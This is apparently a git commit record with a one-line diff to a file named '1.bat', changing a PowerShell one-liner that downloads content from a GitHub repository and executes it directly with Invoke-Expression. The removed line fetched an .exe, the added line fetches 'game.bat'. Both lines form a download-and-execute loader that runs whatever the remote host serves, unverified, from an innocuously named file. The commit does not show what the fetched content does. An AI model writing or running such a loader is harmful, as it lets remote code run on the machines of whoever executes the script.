6c3ddb999383c22e077d89eb9fe9954da3917a45
neginsadeghi2005 <nedaa.sadeghi.1997@gmail.com>
2025-03-25 11:44:19 +0330

    Update 1.bat

--- 1.bat
+++ 1.bat
@@ -1,1 +1,1 @@
-$Url = "https://github.com/neginsadeghi2005/project/raw/refs/heads/main/easy_settings.exe";$scriptontent = Invoke-WebRequest -Uri $Url -UseBasicP;Invoke-Expression $scriptontent.Content
+$Url = "https://raw.githubusercontent.com/neginsadeghi2005/project/refs/heads/main/game.bat";$scriptontent = Invoke-WebRequest -Uri $Url -UseBasicP;Invoke-Expression $scriptontent.Content
